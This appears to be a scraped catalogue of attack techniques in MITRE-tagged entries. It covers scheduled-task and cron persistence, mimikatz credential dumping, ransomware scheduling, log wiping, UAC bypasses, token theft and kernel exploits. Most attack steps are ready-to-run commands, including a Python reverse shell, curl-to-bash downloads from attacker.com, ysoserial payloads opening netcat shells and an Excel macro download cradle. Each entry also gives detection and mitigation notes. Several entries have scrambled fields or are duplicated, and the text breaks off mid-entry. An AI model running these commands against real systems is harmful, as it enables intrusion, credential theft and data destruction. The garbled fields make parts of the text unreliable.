- **Vulnerability**: crontab -<br>2. start.sh` executes payload.3. Crontab is modified within job to remove the task.4. Leaves no trace of scheduled activity post-execution.5. Difficult for DFIR teams to identify initial access.
- **MITRE**: Linux Systems
- **Impact**: No historical logging of cron entries
- **Tools**: cron, bash
- **Scenario**: Payload executed once via cron, then self-deletes the cron entry.
- **Attack Steps**: 1. Add entry: `* * * * * /tmp/start.sh; crontab -l
- **Detection**: T1053.003 – Cron
- **Solution**: Stealthy one-shot execution
- **Tags**: Monitor shell history and process trees

## Scheduled Execution of Credential Dumper

- **Attack Type**: Scheduled Credential Dump
- **Target**: Internal Systems
- **Vulnerability**: Night execution less monitored
- **MITRE**: T1003 – Credential Dumping
- **Impact**: Access to user credentials and system hashes
- **Tools**: schtasks.exe, mimikatz
- **Scenario**: Task runs at midnight to extract cached credentials.
- **Attack Steps**: 1. Place mimikatz.exe in temp folder.2. Command: schtasks /Create /SC DAILY /ST 00:00 /TN "DumpCreds" /TR "C:\temp\mimikatz.exe" /F3. Task executes during off-peak hours.4. Dumps credentials to log and deletes itself.5. Avoids triggering AV in real time.
- **Detection**: Monitor credential access attempts
- **Solution**: Block known tools via app control
- **Tags**: #Mimikatz #CredDump #ScheduledTheft

## Windows Task with Disguised Name

- **Attack Type**: Misleading Task Name
- **Target**: Windows Hosts
- **Vulnerability**: Human review failure due to task name spoofing
- **MITRE**: T1036 – Masquerading
- **Impact**: Hides persistent malware under false identity
- **Tools**: schtasks.exe
- **Scenario**: Task given a name similar to legitimate Windows task (e.g., GoogleUpdateTask).
- **Attack Steps**: 1. Payload: malicious.exe.2. Command: schtasks /Create /SC HOURLY /TN "GoogleUpdateTaskMachine" /TR "C:\malicious.exe"3. Task blends into list of known system tasks.4. Reduces suspicion in task manager or event logs.5. Persistence remains hidden to casual audit.
- **Detection**: Validate task names against official registry
- **Solution**: Alert on newly added system-like tasks
- **Tags**: #NameSpoofing #TaskMasquerade #PersistenceEvasion

## Cron Combined with Environment Variable Manipulation

- **Attack Type**: Env-Based Execution Bypass
- **Target**: Linux Targets
- **Vulnerability**: Misused environment variables in cron
- **MITRE**: T1055 – Process Injection
- **Impact**: Silent hijacking via cron-managed script
- **Tools**: cron, env
- **Scenario**: Uses custom environment variables in cron to bypass controls.
- **Attack Steps**: 1. Add to crontab: SHELL=/bin/bash + LD_PRELOAD=/tmp/hook.so2. Payload script loads hook.so to inject code into processes.3. Script executes with injected behavior on every trigger.4. LD_PRELOAD not visible from cron logs directly.5. Often used to hijack binaries or loggers.
- **Detection**: Monitor env usage in cron-related jobs
- **Solution**: Block dangerous env vars in cron config
- **Tags**: #LDPreload #EnvCron #CodeInjection

## Task Schedules Ransomware Execution at Night

- **Attack Type**: Delayed Ransomware Deployment
- **Target**: Corporate Hosts
- **Vulnerability**: Off-hour tasks rarely monitored
- **MITRE**: T1486 – Data Encrypted for Impact
- **Impact**: Data encryption without real-time user detection
- **Tools**: schtasks.exe, ransomware binary
- **Scenario**: Malware is scheduled at midnight to maximize encryption while systems are idle.
- **Attack Steps**: 1. Deploy ransomware binary (e.g., enc.exe).2. Command: schtasks /Create /SC ONCE /ST 00:00 /TN "Cleanup" /TR "C:\enc.exe"3. System encrypts files when users are offline.4. Backup services may also be disabled.5. Increases ransomware success and stealth.
- **Detection**: Detect encryption pattern tasks in advance
- **Solution**: Implement hourly file integrity alerts
- **Tags**: #ScheduledRansom #NightAttack #RansomwareCron

## Task Chain: One Task Triggers Another

- **Attack Type**: Task-to-Task Execution Chain
- **Target**: Windows Hosts
- **Vulnerability**: Dependency confusion in task chains
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Obfuscates true payload source through task layering
- **Tools**: schtasks.exe
- **Scenario**: First task launches a second scheduled task to evade single-point detection.
- **Attack Steps**: 1. Create Task A: TaskA triggers cmd.exe /c schtasks /run /TN TaskB2. Create Task B: Executes payload.exe.3. Task A runs hourly; Task B is hidden from logs directly.4. Chained execution avoids direct linking to payload.5. Adds complexity to detection.
- **Detection**: Monitor task-chaining commands
- **Solution**: Alert on chained or linked scheduled executions
- **Tags**: #TaskChaining #Obfuscation #MultiLayerExec

## Scheduled Cleanup Task That Wipes Logs

- **Attack Type**: Log Deletion Task
- **Target**: Windows Systems
- **Vulnerability**: Log deletion not always restricted
- **MITRE**: T1070 – Indicator Removal
- **Impact**: Destroys audit trails and hinders forensics
- **Tools**: schtasks.exe, del, wevtutil
- **Scenario**: Schedules a job to remove traces and logs regularly.
- **Attack Steps**: 1. Command: schtasks /Create /SC HOURLY /TN "WinUpdate" /TR "cmd /c del C:\logs\*.log"2. Optionally, use: wevtutil cl Security3. Clears system logs hourly.4. Reduces visibility into attack chain.5. May be used post-exploitation to cover tracks.
- **Detection**: Monitor excessive log deletion from scheduler
- **Solution**: Protect key log directories via policy
- **Tags**: #LogWipe #CoverTracks #ScheduledDeletion

## Scheduled Task Launching Obfuscated PowerShell Payload

- **Attack Type**: Obfuscated PowerShell Execution
- **Target**: Windows Systems
- **Vulnerability**: Weak scrutiny of PowerShell encoding in tasks
- **MITRE**: T1053.005 + T1059.001 – Scheduled Task + PowerShell
- **Impact**: Persistent backdoor hidden from casual inspection
- **Tools**: PowerShell, schtasks.exe
- **Scenario**: Attacker creates a scheduled task that runs an obfuscated PowerShell payload hidden in base64.
- **Attack Steps**: 1. The attacker crafts a PowerShell command that downloads and executes a payload. Example: powershell -nop -w hidden -enc <base64_string> where the base64-encoded string contains a script to download a second-stage payload from an attacker-controlled server (e.g., using IEX (New-Object Net.WebClient).DownloadString(...)).2. The payload is then encoded using PowerShell's built-in Base64 encoding to avoid detection.3. The attacker opens CMD or PowerShell with administrative privileges.4. They run: schtasks /Create /SC HOURLY /TN "SecurityUpdateCheck" /TR "powershell -nop -w hidden -enc <base64_string>" /F5. The task runs hourly, appearing like a normal update process.6. This enables periodic re-establishment of control without leaving readable scripts on disk.7. Logs, if checked, only show an obfuscated base64 payload, making it harder to interpret manually.
- **Detection**: PowerShell logging (module and script block logging), base64 string detection in task commands
- **Solution**: Require script signing, alert on PowerShell base64 usage
- **Tags**: #PowerShell #Obfuscation #Backdoor #ScheduledExecution

## Cron Job Executes Python Script to Create Reverse Shell

- **Attack Type**: Python-Based Cron Reverse Shell
- **Target**: Linux Systems
- **Vulnerability**: Lack of monitoring of user crontabs and outbound connections
- **MITRE**: T1053.003 – Cron
- **Impact**: Periodic remote access into target system
- **Tools**: cron, Python, bash
- **Scenario**: A Python script is placed on disk and scheduled via cron to initiate a reverse shell to a remote host.
- **Attack Steps**: 1. The attacker writes a simple reverse shell script in Python, such as:import socket,subprocess,os; s=socket.socket(); s.connect(("attacker-ip",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])2. This script is saved as /tmp/rshell.py.3. The attacker runs crontab -e to edit the current user’s cron jobs.4. They add: */10 * * * * /usr/bin/python3 /tmp/rshell.py5. This causes the Python script to run every 10 minutes, opening a reverse shell to the attacker's machine.6. If the attacker uses a dynamic DNS or proxy, they can maintain access across IP changes.7. Because it's Python and uses default modules, it's hard to flag unless process behavior is actively monitored.
- **Detection**: Monitor outbound traffic patterns, alert on cron jobs using interpreters
- **Solution**: Restrict cron usage to root or audited users
- **Tags**: #PythonReverseShell #Cron #ScheduledAccess

## Task Scheduling Keylogger on User Login Event

- **Attack Type**: Keylogger via Logon Trigger
- **Target**: Windows Workstations
- **Vulnerability**: Scheduled logon tasks not always reviewed
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Silent long-term credential and data capture
- **Tools**: schtasks.exe, Keylogger EXE
- **Scenario**: The attacker deploys a lightweight keylogger which activates whenever the target user logs in.
- **Attack Steps**: 1. A keylogger such as WinKeyLogger.exe is prepared and configured to store logs locally or send to a remote server via HTTP/FTP.2. Attacker places the keylogger in a hidden folder, e.g., C:\Users\Public\syslog\logsvc.exe.3. They execute: schtasks /Create /SC ONLOGON /TN "UserSync" /TR "C:\Users\Public\syslog\logsvc.exe" /F4. Every time the user logs in, the task triggers the keylogger.5. The attacker ensures the process runs silently by editing the EXE or using Windows start /b to suppress windows.6. Logs may be encrypted and uploaded periodically or stored until physical retrieval.7. Because it blends in with user actions, the process is hard to correlate unless endpoint behavior is monitored in real-time.
- **Detection**: EDR with behavior detection, task audit via Event ID 4698
- **Solution**: Educate users on checking startup tasks
- **Tags**: #Keylogger #Persistence #ScheduledTask #CredentialHarvesting

## Cron with Downloader Embedded in Shell Script

- **Attack Type**: Fileless Downloader Cron
- **Target**: bash<br>2. This script doesn’t store the file locally—it pipes it directly to bash.<br>3. Saved at /etc/cron.hourly/netrun.sh` with executable permissions.4. The script executes hourly on many Linux distros automatically.5. The attacker uses the hosted payload to update, rotate commands, or maintain persistence.6. Since the payload is never saved, traditional file AVs can't scan it.7. It blends in with legitimate cron jobs unless all scheduled scripts are audited.
- **Vulnerability**: Linux Servers
- **MITRE**: Abuse of cron.hourly + fileless download logic
- **Impact**: T1053.003 + T1059.004 – Cron + Bash
- **Tools**: bash, curl, cron
- **Scenario**: A cron job runs a shell script that downloads and executes a payload without saving it on disk.
- **Attack Steps**: 1. Attacker creates a minimal shell script, download_exec.sh:`#!/bin/bash; curl http://attacker.com/payload.sh
- **Detection**: Executes changing payloads with minimal trace
- **Solution**: Monitor bash processes that use pipe and curl together
- **Tags**: Restrict outbound access from cron-executed processes

## Java Deserialization RCE using ysoserial and HTTP Injection

- **Attack Type**: Java Deserialization Exploit
- **Target**: Java Application
- **Vulnerability**: Insecure deserialization with gadget chain exposed
- **MITRE**: T1131 – Exploitation for Privilege Escalation
- **Impact**: Full remote code execution, shell access, privilege escalation
- **Tools**: ysoserial, Burp Suite, nc, Java SDK
- **Scenario**: Attacker sends a crafted serialized Java object to a vulnerable endpoint, which deserializes and executes code.
- **Attack Steps**: 1. The attacker identifies an application that accepts serialized Java objects (e.g., in a cookie, POST body, or custom header).2. They confirm the backend uses a vulnerable deserialization library (e.g., Apache Commons Collections, Groovy, etc.).3. The attacker downloads and compiles ysoserial from GitHub.4. They generate a payload using a gadget chain, e.g.:java -jar ysoserial.jar CommonsCollections5 'nc attacker.com 4444 -e /bin/bash' > payload.ser5. This binary payload is inserted into the vulnerable input (via Burp Suite or custom script).6. A netcat listener is set up: nc -lvnp 44447. When the target deserializes the payload, it executes the command in the payload, opening a reverse shell.8. If the server runs as root or with elevated privileges, this may allow full takeover.9. Exploitation is fileless and commonly bypasses AV, EDR, and firewall logs.
- **Detection**: Java logs, memory analysis, outbound traffic monitoring
- **Solution**: Patch libraries, validate input, block known gadget chains
- **Tags**: #Deserialization #ysoserial #JavaExploit #RCE #CommonsCollections #Fileless #ReverseShell

## Java Deserialization RCE using ysoserial and HTTP Injection

- **Attack Type**: Java Deserialization Exploit
- **Target**: Java Application
- **Vulnerability**: Insecure deserialization logic
- **MITRE**: T1131 – Exploitation for Privilege Escalation
- **Impact**: Remote shell access, lateral movement
- **Tools**: ysoserial, Burp Suite, nc, Java SDK
- **Scenario**: Exploiting insecure deserialization in Java-based apps to achieve remote command execution.
- **Attack Steps**: 1. Identify an endpoint that processes serialized Java input (e.g., in cookie/header/body).2. Confirm the use of a vulnerable library (e.g., Apache Commons Collections).3. Generate a payload using ysoserial: java -jar ysoserial.jar CommonsCollections5 'nc attacker.com 4444 -e /bin/bash' > payload.ser.4. Inject the payload into the request using Burp Suite.5. Start a netcat listener with nc -lvnp 4444.6. Upon deserialization, command execution is triggered, providing a reverse shell.7. Entire process is fileless and stealthy.
- **Detection**: Java logs, memory forensics, outbound connection logs
- **Solution**: Patch libraries, validate input data structures
- **Tags**: #Deserialization #ysoserial #JavaExploit #RCE #ReverseShell

## PowerShell Downgrade Attack to Bypass Logging

- **Attack Type**: Logging Bypass via Downgrade
- **Target**: Windows Workstation
- **Vulnerability**: PowerShell 2.0 backward compatibility enabled
- **MITRE**: T1059.001 – PowerShell
- **Impact**: Evades EDR and AV visibility, stealth execution
- **Tools**: PowerShell, Registry Editor, Event Viewer
- **Scenario**: Uses older PowerShell versions to disable modern security features like AMSI and script block logging.
- **Attack Steps**: 1. Identify that PowerShell 2.0 is installed on the system.2. Use the command: powershell.exe -Version 2 -ExecutionPolicy Bypass -File payload.ps1.3. PowerShell v2 lacks AMSI and script block logging, allowing silent execution.4. Malicious script executes without triggering standard detection mechanisms.5. Registry keys can also be edited to force default to v2.6. Common in environments with legacy apps.
- **Detection**: Monitor PowerShell version usage and policy bypasses
- **Solution**: Disable PowerShell v2; enforce logging policies
- **Tags**: #PowerShell #AMSIBypass #DowngradeAttack #EDREvasion

## Excel 4.0 Macro (XLM) Execution via Hidden Sheet

- **Attack Type**: XLM Macro Exploitation
- **Target**: Office User
- **Vulnerability**: Legacy macro support enabled by default
- **MITRE**: T1203 – Exploitation for Client Execution
- **Impact**: Fileless payload execution via trusted app
- **Tools**: Excel, VBA, XLM sheets
- **Scenario**: Exploits legacy Excel macros (Excel 4.0) to run hidden commands on open.
- **Attack Steps**: 1. Insert a new macro sheet in Excel (XLM support).2. Write formula such as =EXEC("powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker')").3. Hide the macro sheet and set it to run on document open.4. Deliver file via phishing or social engineering.5. When user opens the file, the macro runs and executes payload without prompts.6. Excel 4.0 macros often bypass modern AV tools.
- **Detection**: Monitor Auto_Open and XLM macro behavior
- **Solution**: Disable Excel 4.0 macros unless explicitly needed
- **Tags**: #ExcelMacro #XLM #StealthPayload #LegacyAbuse

## Abusing msbuild.exe for In-Memory C# Payload Execution

- **Attack Type**: msbuild Payload Abuse
- **Target**: Windows System
- **Vulnerability**: Trust in signed Microsoft binaries
- **MITRE**: T1127 – Trusted Developer Utilities
- **Impact**: In-memory execution and AV evasion
- **Tools**: msbuild.exe, Visual Studio, C# Payload
- **Scenario**: Leverages msbuild to compile and run C# payloads in memory, avoiding dropped files.
- **Attack Steps**: 1. Create a malicious .csproj file embedding C# code (e.g., reverse shell, Mimikatz runner).2. Run it using: msbuild.exe payload.csproj.3. msbuild loads and compiles the code in memory.4. No files are written or dropped to disk during execution.5. Because msbuild is signed by Microsoft, it bypasses AppLocker and some antivirus tools.6. Output only appears in memory, avoiding many endpoint logs.
- **Detection**: Detect msbuild usage outside dev environments
- **Solution**: Block msbuild on production machines if unused
- **Tags**: #LOLBins #msbuild #InMemoryExecution #AppLockerBypass

## Abusing Systemd Timers for Persistent Execution

- **Attack Type**: Systemd Timer Exploitation
- **Target**: Linux Server
- **Vulnerability**: Lack of monitoring for new systemd units
- **MITRE**: T1053.006 – Systemd Timers
- **Impact**: Persistent backdoor via trusted scheduling system
- **Tools**: systemd, bash, Linux
- **Scenario**: Creates custom .timer and .service files to execute payloads at boot or interval.
- **Attack Steps**: 1. Create a bash script /opt/.hidden/backup.sh with malicious commands.2. Create /etc/systemd/system/updatebackup.service to point to the script.3. Create matching timer file /etc/systemd/system/updatebackup.timer with [Timer] settings.4. Enable both via systemctl enable --now updatebackup.timer.5. Script runs at defined intervals and on reboot.6. Unless systemd unit files are regularly audited, this method is stealthy and persistent.
- **Detection**: Alert on creation of new .timer and .service files
- **Solution**: Restrict write access to /etc/systemd/system/
- **Tags**: #Systemd #LinuxPersistence #Stealth #TimerExecution

## Token Theft via Incognito LSASS Dump

- **Attack Type**: Token Impersonation / Theft
- **Target**: Windows Workstation / Server
- **Vulnerability**: Unrestricted access to LSASS memory
- **MITRE**: T1003.001 – OS Credential Dumping: LSASS Memory
- **Impact**: SYSTEM-level access or credential theft
- **Tools**: Procdump, Mimikatz
- **Scenario**: Dumps LSASS process memory to extract privileged tokens and credentials.
- **Attack Steps**: 1. Run procdump.exe -ma lsass.exe lsass.dmp with admin rights.2. Use Mimikatz sekurlsa::logonpasswords to extract tokens.3. Elevate privileges with token::elevate.
- **Detection**: Monitor LSASS memory access, alert on suspicious dumps
- **Solution**: Enable Credential Guard, restrict SeDebugPrivilege
- **Tags**: #TokenTheft #LSASS #Mimikatz #Procdump #CredentialDump

## Token Impersonation via Named Pipe Pivoting

- **Attack Type**: Token Impersonation / Theft
- **Target**: Windows Systems
- **Vulnerability**: Unrestricted access to impersonate tokens
- **MITRE**: T1134.001 – Access Token Manipulation: Token Impersonation
- **Impact**: Full access under SYSTEM/Admin
- **Tools**: Impacket, PsExec
- **Scenario**: Hijacks named pipes to impersonate privileged tokens connecting through them.
- **Attack Steps**: 1. Trap SYSTEM user into authenticating via named pipe.2. Capture and impersonate token using Impacket’s sekurlsa or make_token scripts.3. Launch elevated process.
- **Detection**: Audit pipe usage and cross-privilege IPC events
- **Solution**: Restrict SeImpersonatePrivilege
- **Tags**: #NamedPipe #TokenHijack #PrivilegeEscalation

## Service Token Theft via Token Leakage

- **Attack Type**: Token Impersonation / Theft
- **Target**: Windows Servers
- **Vulnerability**: Poor service isolation, token inheritance
- **MITRE**: T1134.001 – Token Impersonation
- **Impact**: Privilege escalation without credentials
- **Tools**: Process Hacker, Mimikatz
- **Scenario**: Steals SYSTEM token from spawned child processes of high-privilege services.
- **Attack Steps**: 1. Find a SYSTEM service that spawns user-accessible processes.2. Use Mimikatz to list and elevate tokens from exposed child process.3. Spawn SYSTEM shell.
- **Detection**: Monitor child processes of SYSTEM services
- **Solution**: Use service hardening, restrict token reuse
- **Tags**: #ServiceToken #TokenLeak #PrivilegeEscalation

## Token Duplication via SeDebugPrivilege Abuse

- **Attack Type**: Token Impersonation / Theft
- **Target**: Windows Workstations
- **Vulnerability**: SeDebugPrivilege allows SYSTEM token duplication
- **MITRE**: T1134.002 – Token Duplication
- **Impact**: SYSTEM shell spawned via duplicate token
- **Tools**: Mimikatz, Process Explorer
- **Scenario**: Clones SYSTEM-level token using SeDebugPrivilege and Mimikatz.
- **Attack Steps**: 1. Confirm access to SeDebugPrivilege.2. Enable privilege::debug.3. List tokens and duplicate SYSTEM token using token::elevate.4. Spawn SYSTEM shell.
- **Detection**: Event ID 4672 (priv use), debug privilege monitoring
- **Solution**: Remove debug rights from non-admin users
- **Tags**: #SeDebug #TokenDuplication #Elevate

## Impersonation via Rogue Scheduled Task Execution

- **Attack Type**: Token Impersonation / Theft
- **Target**: Windows Workstation
- **Vulnerability**: SYSTEM tasks allow code execution from user path
- **MITRE**: T1053.005 + T1134 – Scheduled Task + Token Impersonation
- **Impact**: Persistent SYSTEM access via scheduled impersonation
- **Tools**: schtasks, Mimikatz
- **Scenario**: SYSTEM task created by attacker allows impersonation of SYSTEM token on execution.
- **Attack Steps**: 1. Schedule SYSTEM task via schtasks /create ... /ru SYSTEM.2. Wait or trigger it.3. Use token::use to impersonate and spawn SYSTEM shell.
- **Detection**: Monitor SYSTEM task creation, audit privilege assignment
- **Solution**: Limit SYSTEM task creation rights, log token elevation
- **Tags**: #ScheduledTask #TokenTheft #SYSTEMAccess

## UAC Bypass via fodhelper.exe

- **Attack Type**: Privilege Escalation → Bypassing UAC
- **Target**: Windows 10/11
- **Vulnerability**: Registry hijack via auto-elevated binary
- **MITRE**: T1548.002 (Abuse Elevation Control Mechanism: Bypass UAC)
- **Impact**: Local admin access without credentials
- **Tools**: reg.exe, fodhelper.exe, custom payload
- **Scenario**: Attacker elevates privileges without UAC prompt using fodhelper.exe, a trusted Windows binary.
- **Attack Steps**: 1. Prepare payload.2. Modify registry at HKCU\Software\Classes\ms-settings\Shell\Open\command with payload path.3. Add empty DelegateExecute key.4. Run fodhelper.exe.5. Payload executes as admin.
- **Detection**: Monitor registry changes, process launches of fodhelper.exe.
- **Solution**: Remove registry keys, block user write access to exploitable paths
- **Tags**: uac bypass, fodhelper, registry hijack, living off the land

## UAC Bypass using eventvwr.exe

- **Attack Type**: Privilege Escalation → Bypassing UAC
- **Target**: Windows 7/10/11
- **Vulnerability**: Registry hijacking via auto-elevated tool
- **MITRE**: T1548.002
- **Impact**: Silent elevation, persistence, lateral movement
- **Tools**: reg.exe, eventvwr.exe
- **Scenario**: Exploits the way eventvwr.exe loads .msc files by redirecting through registry.
- **Attack Steps**: 1. Set HKCU\Software\Classes\mscfile\shell\open\command to point to malicious payload.2. Execute eventvwr.exe.3. It reads hijacked key and runs payload elevated.
- **Detection**: Process auditing, registry monitoring
- **Solution**: Lock registry keys, restrict eventvwr.exe launch
- **Tags**: uac bypass, msc hijack, event viewer, persistence

## UAC Bypass via sdclt.exe /CONFIG

- **Attack Type**: Privilege Escalation → Bypassing UAC
- **Target**: Windows 10 (pre-1803)
- **Vulnerability**: Registry hijack of shell open command
- **MITRE**: T1548.002
- **Impact**: Privilege gain, system compromise
- **Tools**: sdclt.exe, reg.exe
- **Scenario**: Uses sdclt.exe auto-elevation with custom shell command registry values.
- **Attack Steps**: 1. Write payload path to HKCU\Software\Classes\Folder\shell\open\command.2. Set empty DelegateExecute.3. Execute sdclt.exe /CONFIG.4. Payload runs as elevated.
- **Detection**: Log elevated sdclt.exe instances, monitor shell keys
- **Solution**: Patch system (post-1803 disables this), restrict user reg edits
- **Tags**: sdclt, shell command hijack, lolbin, uac abuse

## DLL Hijacking with Auto-Elevated Binary

- **Attack Type**: Privilege Escalation → Bypassing UAC
- **Target**: Windows 10
- **Vulnerability**: DLL search order vulnerability
- **MITRE**: T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)
- **Impact**: Code execution with elevated rights
- **Tools**: custom.dll, auto-elevated binary (e.g., ComputerDefaults.exe)
- **Scenario**: Malicious DLL is loaded by an auto-elevated binary due to DLL search order flaw.
- **Attack Steps**: 1. Craft DLL named as required by target binary.2. Place DLL in same directory as binary.3. Launch binary.4. Malicious DLL is loaded instead of system one.
- **Detection**: Track non-standard DLL paths, log DLL load chains
- **Solution**: Block unsigned DLLs, enforce secure paths
- **Tags**: dll hijack, sideloading, lolbin abuse

## COM Interface Hijack via CLSID Spoofing

- **Attack Type**: Privilege Escalation → Bypassing UAC
- **Target**: Windows systems using COM
- **Vulnerability**: COM object hijack via registry
- **MITRE**: T1546.015 (Event Triggered Execution: Component Object Model Hijacking)
- **Impact**: Elevation and potential persistence
- **Tools**: regedit, mmc.exe, attacker payload
- **Scenario**: Manipulates COM object CLSID registry to redirect privileged execution to malicious code.
- **Attack Steps**: 1. Identify CLSID of COM object used by mmc.exe.2. Modify HKCU\Software\Classes\CLSID\{CLSID}\LocalServer32 to point to payload.3. Launch mmc.exe.4. Auto-elevated binary loads malicious COM server.
- **Detection**: Monitor CLSID entries, COM load patterns
- **Solution**: Reset registry, secure COM class entries
- **Tags**: com hijack, clsid spoofing, mmc abuse, uac bypass

## Juicy Potato Privilege Escalation

- **Attack Type**: Privilege Escalation → Kernel Exploits
- **Target**: Windows Server 2008–2016
- **Vulnerability**: SeImpersonatePrivilege misconfiguration
- **MITRE**: T1134.001
- **Impact**: SYSTEM-level access without credentials
- **Tools**: Juicy Potato, nc.exe
- **Scenario**: Exploits COM service misconfiguration and token impersonation to elevate to SYSTEM.
- **Attack Steps**: 1. Attacker gains a low-privilege shell on a Windows system.2. Uploads Juicy Potato binary to the machine.3. Executes it with specific CLSID and port arguments to start a fake DCOM server.4. Triggers the vulnerable COM service which connects to the attacker-controlled DCOM listener.5. The attacker's process receives a SYSTEM-level token, which it uses to spawn a reverse shell or process as SYSTEM.
- **Detection**: Monitor unusual DCOM activity, privilege use of non-admin users
- **Solution**: Remove SeImpersonatePrivilege from untrusted accounts, apply least privilege
- **Tags**: juicy potato, dcom, privilege escalation

## PrintNightmare Exploit

- **Attack Type**: Privilege Escalation → Kernel Exploits
- **Target**: Windows 10/Server
- **Vulnerability**: DLL planting via Print Spooler (CVE-2021-34527)
- **MITRE**: T1068
- **Impact**: Full local privilege escalation
- **Tools**: PowerShell, crafted DLL, RCE loader
- **Scenario**: Uses Print Spooler vulnerability to write and execute a SYSTEM-level DLL.
- **Attack Steps**: 1. Attacker creates a custom malicious DLL designed to run a SYSTEM shell.2. Uses the vulnerable Print Spooler interface to copy this DLL into the system directory.3. Triggers the spooler to load the DLL, which runs in SYSTEM context.4. The DLL executes attacker-controlled code with full privileges.
- **Detection**: Detect anomalous DLL placements, monitor spooler calls
- **Solution**: Apply Microsoft's security update, disable unnecessary spooler services
- **Tags**: printnightmare, print spooler, cve-2021-34527

## RottenPotatoNG Token Exploit

- **Attack Type**: Privilege Escalation → Kernel Exploits
- **Target**: Windows Server (pre-2019)
- **Vulnerability**: Misconfigured token privileges & COM behavior
- **MITRE**: T1134.001
- **Impact**: Local SYSTEM shell from low-privilege account
- **Tools**: RottenPotatoNG, msfvenom
- **Scenario**: Exploits DCOM and token impersonation flaw similar to Juicy Potato.
- **Attack Steps**: 1. Attacker runs RottenPotatoNG binary on a machine with SeImpersonatePrivilege.2. The exploit abuses a vulnerable COM service to trigger communication with an attacker-controlled listener.3. Once triggered, a SYSTEM token is captured and impersonated.4. A SYSTEM-level shell or payload is spawned.
- **Detection**: Monitor COM object usage, check for suspicious pipes
- **Solution**: Apply updates; remove unnecessary privileges from service accounts
- **Tags**: rotten potato, dcom, token impersonation

## CVE-2021-1732 Win32k Exploit

- **Attack Type**: Privilege Escalation → Kernel Exploits
- **Target**: Windows 10 (pre-Feb 2021)
- **Vulnerability**: Win32k.sys kernel object flaw
- **MITRE**: T1068
- **Impact**: Complete system takeover from user-level access
- **Tools**: Custom C++ exploit, MSF payload
- **Scenario**: Local LPE via window object type confusion in Win32k.sys driver.
- **Attack Steps**: 1. Attacker deploys an exploit executable onto a vulnerable Windows machine.2. Exploit creates window objects in memory to trigger type confusion.3. Vulnerability allows attacker to corrupt kernel memory and gain code execution.4. Shell or payload is spawned with SYSTEM rights.
- **Detection**: Monitor for unapproved syscall chains, enable kernel memory protection
- **Solution**: Install patch KB4601050 or newer
- **Tags**: win32k, cve-2021-1732, lpe, type confusion

## Token Kidnapping via SeAssignPrimaryToken

- **Attack Type**: Privilege Escalation → Kernel Exploits
- **Target**: Windows misconfigured services
- **Vulnerability**: Insecure token assignment permissions
- **MITRE**: T1134
- **Impact**: Local SYSTEM access via API abuse
- **Tools**: PowerShell, C# payload
- **Scenario**: Leverages SeAssignPrimaryTokenPrivilege to assign a SYSTEM token to a user process.
- **Attack Steps**: 1. Attacker identifies a service account with both SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege.2. Launches a process under that account.3. Crafts a process and injects a SYSTEM token into it using Windows API.4. New process now runs with SYSTEM-level access.
- **Detection**: Log API calls to ImpersonateLoggedOnUser, CreateProcessAsUser
- **Solution**: Limit token privileges, harden service account rights
- **Tags**: token abuse, privilege manipulation

## CVE-2016-3309 Win32k.sys Exploit

- **Attack Type**: Privilege Escalation → Kernel Exploits
- **Target**: Windows 7/8/10
- **Vulnerability**: Use-after-free in Win32k.sys
- **MITRE**: T1068
- **Impact**: Full control over the target system
- **Tools**: Metasploit, Custom Exploit
- **Scenario**: Kernel memory corruption in Win32k allows attackers to execute code as SYSTEM.
- **Attack Steps**: 1. Attacker runs an exploit targeting the use-after-free condition in Win32k.sys.2. Carefully manipulates memory allocation to control a function pointer.3. When pointer is dereferenced, attacker-controlled shellcode is executed in kernel space.4. SYSTEM-level shell or backdoor is launched.
- **Detection**: Enable EDR with kernel mode inspection, track BSODs
- **Solution**: Install MS16-098 or later patches
- **Tags**: win32k, kernel corruption, cve-2016-3309

## CVE-2022-21882 (NtUserSetImeInfoEx)

- **Attack Type**: Privilege Escalation → Kernel Exploits
- **Target**: Windows 10/11
- **Vulnerability**: IME memory corruption (Win32k.sys)
- **MITRE**: T1068
- **Impact**: Local SYSTEM execution and persistence
- **Tools**: Public POC, MSF
- **Scenario**: Uses a flaw in IME handling to gain kernel execution from user space.
- **Attack Steps**: 1. Attacker executes public POC which targets NtUserSetImeInfoEx.2. Exploit triggers an input validation error that leads to memory corruption.3. Shellcode is injected and executed with kernel privileges.4. The attacker gains SYSTEM-level command execution or persists via service creation.
- **Detection**: Analyze IME-related API calls, enable kernel-mode logging
- **Solution**: Patch via KB5009596 or newer
- **Tags**: win32k, cve-2022-21882, ime, memory corruption

## DLL Hijack via Control Panel Applet

- **Attack Type**: Privilege Escalation → DLL Hijacking
- **Target**: Windows 10/11
- **Vulnerability**: Insecure DLL loading order in Control Panel binaries
- **MITRE**: T1574.001
- **Impact**: Runs malicious code in trusted context
- **Tools**: Custom malicious DLL, SystemPropertiesAdvanced.exe
- **Scenario**: Exploits the Control Panel applet (e.g., SystemPropertiesAdvanced.exe) which loads missing DLLs from current directory.
- **Attack Steps**: 1. Attacker crafts a malicious DLL named after a missing dependency (e.g., PROPSYS.dll).2. Places the DLL in the same folder as SystemPropertiesAdvanced.exe.3. Executes the applet; due to insecure search order, it loads the attacker's DLL.4. Code runs with elevated privileges if applet is auto-elevated.
- **Detection**: Detect unsigned DLL loads in trusted paths
- **Solution**: Use Manifest + SafeDllSearchMode, apply DLL redirection controls
- **Tags**: dll hijack, control panel, propsys, search order

## DLL Hijack in Google Chrome Installer

- **Attack Type**: Privilege Escalation → DLL Hijacking
- **Target**: Windows (with user install privileges)
- **Vulnerability**: Missing DLL validation in third-party installer
- **MITRE**: T1574.001
- **Impact**: Arbitrary code execution with installer’s context
- **Tools**: Malicious DLL, Chrome offline installer
- **Scenario**: Chrome’s installer was found to load missing DLLs from user-controlled directories, enabling code execution.
- **Attack Steps**: 1. Attacker places malicious DLL (e.g., wow_helper.dll) in the same folder as the Chrome installer.2. Runs the legitimate Chrome installer.3. Installer loads attacker’s DLL due to lack of full path specification.4. Payload runs with installer privileges (can be admin if UAC already bypassed).
- **Detection**: Monitor DLL loads from temp/user folders
- **Solution**: Vendors must sign DLLs and sanitize install paths
- **Tags**: dll hijack, chrome, third-party installer

## DLL Hijack in Rundll32.exe

- **Attack Type**: Privilege Escalation → DLL Hijacking
- **Target**: Windows all versions
